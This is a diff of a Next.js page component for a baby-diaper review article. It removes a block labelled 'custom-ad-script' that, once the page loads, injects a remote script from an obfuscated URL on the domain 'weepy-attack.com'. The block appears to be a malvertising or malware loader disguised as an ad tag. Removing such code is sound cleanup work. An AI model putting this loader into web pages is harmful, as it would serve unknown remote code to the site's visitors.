@@ -25,20 +25,6 @@ export default function BestBabyDiapers() {
           content="Discover the top 10 baby diapers for absorbency, comfort, and eco-friendliness. Tips for choosing the best diapers for your baby."
         />
       </Head>
-      <Script id="custom-ad-script" strategy="afterInteractive">
-        {`
-          (function(xlu){
-            var d = document,
-                s = d.createElement('script'),
-                l = d.scripts[d.scripts.length - 1];
-            s.settings = xlu || {};
-            s.src = "//weepy-attack.com/b.XPVqsBdWGtl/0yYfWccv/eekmi9HuaZ_UslHk_PuTcYT2/MBzMQi3eNuTLAztINmjpYTzQNnDjci1pMYQg";
-            s.async = true;
-            s.referrerPolicy = 'no-referrer-when-downgrade';
-            l.parentNode.insertBefore(s, l);
-          })({})
-        `}
-      </Script>
       <div className="max-w-7xl mx-auto px-4 py-12 flex flex-col lg:flex-row gap-8">
         <div className="max-w-4xl mx-auto px-4 py-12">
           <nav className="flex items-center space-x-2 text-sm text-gray-500 mb-6">
